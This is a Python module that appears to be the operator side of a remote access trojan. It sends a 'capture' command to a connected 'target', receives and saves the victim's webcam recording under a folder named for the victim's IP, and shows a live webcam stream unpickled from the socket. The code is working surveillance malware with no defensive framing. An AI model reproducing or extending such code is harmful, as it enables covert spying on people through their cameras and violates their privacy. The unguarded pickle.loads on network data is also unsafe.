import cv2, struct , pickle ,os
from utils.showUtils import show_video
# to capture webcam feed of target - webcam command
def webcamCapture(conn,ip):
    conn.send('capture'.encode())
    l=int(conn.recv(20480).decode())
    if l>0:
        print("capturing..")
        conn.send("start".encode())
        f=open(os.path.join(ip,"webcam2.avi"),"wb")
        curr_len=0
        while curr_len<l:
            print("",end="\r")
            data=conn.recv(204800000)
            curr_len+=len(data)
            print("Progress: {a:.2f} %".format(a=(curr_len/l)*100),end="")
            f.write(data)


        f.close()
        print("\ndone..")
        conn.send("done".encode())
        show_video(os.path.join(ip,'webcam2.avi'),ip)
    else:
        print('Error accessing webcam...')
        conn.send('Error'.encode())
    output=conn.recv(10240).decode()
    print(output,end="")

def camstream(conn,ip):
    data = b""
    payload_size = struct.calcsize("Q")
    while True:
        while len(data) < payload_size:
            packet = conn.recv(4*1024) # 4K
            if not packet: break
            data+=packet
        packed_msg_size = data[:payload_size]
        data = data[payload_size:]
        msg_size = struct.unpack("Q",packed_msg_size)[0]
        
        while len(data) < msg_size:
            data += conn.recv(4*1024)
        frame_data = data[:msg_size]
        data  = data[msg_size:]
        frame = pickle.loads(frame_data)
        cv2.imshow("RECEIVING VIDEO",frame)
        key = cv2.waitKey(1) & 0xFF
        if key  == ord('q'):
            break
